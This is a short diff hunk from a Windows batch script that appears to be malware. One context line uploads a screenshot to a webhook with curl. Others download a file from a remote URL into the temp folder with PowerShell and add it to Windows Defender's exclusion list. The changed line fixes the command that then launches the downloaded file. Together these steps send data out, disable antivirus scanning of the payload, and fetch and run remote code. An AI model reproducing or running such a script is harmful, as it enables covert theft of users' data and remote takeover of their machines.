@@ -6,4 +6,4 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 curl -i -H 'Expect: application/json' -F file=@%cd%\screenshot.png %webhook%
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.bat'"
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.bat'"
-start %temp%\file.exe
+start %temp%\file.bat
